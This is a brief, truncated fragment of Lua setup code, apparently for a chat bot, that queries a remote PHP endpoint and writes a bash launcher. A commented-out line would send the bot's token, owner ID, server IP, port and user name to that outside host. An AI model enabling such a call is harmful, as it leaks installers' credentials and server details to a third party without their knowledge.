...
data,res = https.request("http://klanrplay.ml/hanensoras/hanenn.php?bn=info&id="..Id)
if res == 200 then
...
--- local t = json:decode(https.request('http://klanrplay.ml/hanensoras/hanenn.php?n=BK&id='..database:get(Server_Done.."UserSudo_Write").."&token="..database:get(Server_Done.."Token_Write").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time))
print("::Black::")
local RunBot = io.open("TrOn", 'w')
RunBot:write([[
#!/usr/bin/env bash
cd $HOME/TrOn
